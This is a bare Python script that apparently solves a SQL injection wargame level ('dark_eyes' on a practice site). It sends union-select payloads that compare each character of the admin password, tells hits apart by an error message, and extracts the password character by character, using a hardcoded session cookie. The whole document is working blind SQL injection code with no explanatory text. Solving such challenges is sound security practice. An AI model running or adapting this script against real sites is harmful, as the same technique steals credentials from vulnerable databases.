import requests

pw = ""

for order in range(0,8):
    for p in range(ord('0'), ord('z')):
        url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id ='admin' and (select 1 union select (ord(substr(pw,"+str(order+1)+",1))="+str(p)+"))%23 "
        cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
        res = requests.get(url,cookies= cookies)
        if 'select id from prob_dark_eyes' in res.text:
            pw = pw +chr(p)
            print(pw)
            break
print(pw)
